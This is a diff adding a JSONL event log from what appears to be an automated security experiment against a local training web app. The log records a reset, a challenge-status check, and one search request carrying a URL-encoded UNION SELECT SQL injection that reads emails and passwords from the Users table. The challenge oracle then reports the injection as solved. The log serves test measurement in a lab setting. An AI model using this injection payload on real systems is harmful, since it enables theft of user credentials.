@@ -1,0 +1,15 @@
+{"t": "2026-11-24T20:36:00.576Z", "event": "run-start", "condition": "E11-SUT05-SQLI-SEARCH-M1", "run_id": "E11-SUT05-SQLI-SEARCH-M1__EX0026__A1", "record_class": "MEASURED_EXPERIMENT"}
+{"t": "2026-11-24T20:36:00.576Z", "event": "step-start", "phase": "reset", "description": "restart the SUT process (SIGTERM to the process group, port refused, start in a new session and group, readiness)"}
+{"t": "2026-11-24T20:36:03.198Z", "event": "step-end", "phase": "reset", "outcome": "SUCCESS"}
+{"t": "2026-11-24T20:36:03.198Z", "event": "step-start", "phase": "starting-state", "description": "GET /api/Challenges: the challenge unionSqlInjectionChallenge is not solved"}
+{"t": "2026-11-24T20:36:03.239Z", "event": "http", "method": "GET", "url": "http://127.0.0.1:3000/api/Challenges", "status": 200, "error": null, "elapsed_s": 0.039, "evidence": "evidence/005-sut05-oracle-start.json"}
+{"t": "2026-11-24T20:36:03.240Z", "event": "step-end", "phase": "starting-state", "outcome": null}
+{"t": "2026-11-24T20:36:03.240Z", "event": "step-start", "phase": "method", "description": "M1 sequence for SQLI-SEARCH, then GET /api/Challenges"}
+{"t": "2026-11-24T20:36:03.240Z", "event": "stimulus-sent"}
+{"t": "2026-11-24T20:36:03.310Z", "event": "http", "method": "GET", "url": "http://127.0.0.1:3000/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--", "status": 200, "error": null, "elapsed_s": 0.07, "evidence": "evidence/006-sut05-m1-1.json"}
+{"t": "2026-11-24T20:36:03.377Z", "event": "http", "method": "GET", "url": "http://127.0.0.1:3000/api/Challenges", "status": 200, "error": null, "elapsed_s": 0.064, "evidence": "evidence/007-sut05-oracle-first-read.json"}
+{"t": "2026-11-24T20:36:03.677Z", "event": "http", "method": "GET", "url": "http://127.0.0.1:3000/api/Challenges", "status": 200, "error": null, "elapsed_s": 0.025, "evidence": "evidence/008-sut05-oracle-last-read.json"}
+{"t": "2026-11-24T20:36:03.677Z", "event": "step-end", "phase": "method", "outcome": "OBSERVED"}
+{"t": "2026-11-24T20:36:03.677Z", "event": "step-start", "phase": "classification", "description": "classify the method observation"}
+{"t": "2026-11-24T20:36:03.677Z", "event": "step-end", "phase": "classification", "outcome": "OBSERVED"}
+{"t": "2026-11-24T20:36:03.678Z", "event": "run-end", "category": "M1_ORACLE_FLIPPED", "attribution": "SUT"}
